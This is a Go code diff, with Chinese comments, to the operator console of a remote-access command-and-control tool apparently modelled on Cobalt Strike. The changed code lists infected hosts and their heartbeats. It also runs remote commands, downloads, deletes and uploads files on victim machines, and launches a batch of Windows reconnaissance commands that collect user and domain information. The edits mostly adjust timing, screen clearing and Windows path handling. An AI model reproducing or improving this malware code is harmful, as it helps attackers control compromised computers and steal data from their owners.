@@ -51,6 +51,7 @@ func main() {
 // 菜单函数
 func menu() {
 	var num int
+	exec.Command("clear") // 清除屏幕
 	fmt.Printf("当前上线主机: %d\n", len(cobalt_tcp.IpChanMap))
 	fmt.Printf("主机编号   主机ip\t主机最后一次心跳时间\t当前时间\t心跳频率\n")
 	//for id, host := range ipChanMap {
@@ -93,6 +94,7 @@ func menu() {
 
 func SelectHost() {
 	var contralId int
+	exec.Command("clear") // 清除屏幕
 	fmt.Printf("1.选择要查看的主机编号\n按0返回上一级\n")
 	//for id, host := range ipChanMap {
 	//	fmt.Printf("%d\t%s\n", id+1, host.Ip)
@@ -124,7 +126,7 @@ func SelectHost() {
 
 func SetHost(hosts cobalt_tcp.HOSTS, id int) {
 	//defer menu() //最后的时候仍然调用menu函数
-	exec.Command("clear") // 清除屏幕
+
 	var num int
 	fmt.Printf("主机名\t主机ip\t主机最后一次心跳时间\t当前时间\t心跳时间\t\n")
 	fmt.Printf("%s\t%s\t\t%s\t%s\t%s\n", hosts.Whoami, hosts.Ip, hosts.Time,
@@ -164,19 +166,26 @@ func SetHost(hosts cobalt_tcp.HOSTS, id int) {
 	switch num {
 
 	case 1:
+		exec.Command("clear") // 清除屏幕
 		SetHost(hosts, id)
 	case 2:
 		ViewHost(hosts, id)
+		//defer SetHost(hosts, id)
 	case 3:
 		ViewDemain(hosts, id)
+		//defer SetHost(hosts, id)
 	case 4:
-		hosts.UseCmd()
+		hosts.UseCmd(id)
+		defer SetHost(hosts, id)
 	case 5:
 		FileDeal(id)
+		defer SetHost(hosts, id)
 	case 6:
 		AllInfo(id)
+		defer SetHost(hosts, id)
 	case 7:
 		Watch(id)
+		defer SetHost(hosts, id)
 	case 0:
 		return
 
@@ -343,7 +352,7 @@ func FileDeal(id int) {
 			}
 		case "cd":
 			if relativePath == ".." {
-				if strings.Index(abslsentPath, "/") == -1 {
+				if strings.Index(abslsentPath, "\\") == -1 {
 					if DEBUG {
 						fmt.Printf("未找到/\n")
 					}
@@ -376,14 +385,22 @@ func FileDeal(id int) {
 				fmt.Printf("path:%s\n", path)
 			}
 			hosts.Chans <- path
+			go cobalt_tcp.Times(800, id)
+			<-cobalt_tcp.IpChanMap[id].ChansTime
 		case "get":
 			hosts.Chans <- "Documentget " + abslsentPath + "/" + relativePath
 			hosts.ChansFileName <- relativePath
+			go cobalt_tcp.Times(800, id)
+			<-cobalt_tcp.IpChanMap[id].ChansTime
 		case "del":
 			hosts.Chans <- "Documentdel " + abslsentPath + "/" + relativePath
+			go cobalt_tcp.Times(800, id)
+			<-cobalt_tcp.IpChanMap[id].ChansTime
 		case "put":
 			//hosts.Chans <- "Documentput " + abslsentPath
 			Fileput(abslsentPath, id)
+			go cobalt_tcp.Times(800, id)
+			<-cobalt_tcp.IpChanMap[id].ChansTime
 		case "quit":
 			hosts.Chans <- "Documentquit"
 			return
@@ -433,6 +450,8 @@ BEGIN:
 	AimName := reg.ReplaceAllString(localPath, ``)
 	cobalt_tcp.IpChanMap[id].Chans <- "Documentput " + AimPath + "/" + AimName
 	cobalt_tcp.IpChanMap[id].Chans <- "Document" + strconv.FormatInt(lens, 10)
+	go cobalt_tcp.Times(100, id)
+	<-cobalt_tcp.IpChanMap[id].ChansTime
 	cobalt_tcp.IpChanMap[id].Chans <- "Document" + string(file)
 
 	if DEBUG {
@@ -481,15 +500,7 @@ func AllInfo(id int) {
 		"所属域":    "net config Workstation",
 	}
 	langCmd := "Cmd\r\n"
-	//cobalt_tcp.WriteCmd()      //进入写入模式
-	//defer cobalt_tcp.ReadCmd() //关闭写入模式
-	//i := len(allDomainCmd) + len(allUserCmd)
-	//var strs []string
-	//for j := 0; j < i; j++ {
-	//	strs = append(strs, "a")
-	//}
-	//text1 := strings.Join(strs, "")
-	//cobalt_tcp.IpChanMap[id].ChansFileName <- text1
+
 	for name, cmd := range allUserCmd { //用来写入用户信息
 		filename := dirname + "/用户信息/" + name
 		cobalt_tcp.IpChanMap[id].ChansFileName <- filename
@@ -504,7 +515,7 @@ func AllInfo(id int) {
 	}
 	cobalt_tcp.IpChanMap[id].Chans <- langCmd[:len(langCmd)-1]
 	//cobalt_tcp.IpChanMap[id].ChansFileName <- "###"
-	//<-cobalt_tcp.IpChanMap[id].ChansBack2
+	//<-cobalt_tcp.IpChanMap[id].ChansTime
 	//if DEBUG {
 	//	fmt.Printf("结束一键执行\n")
 	//}
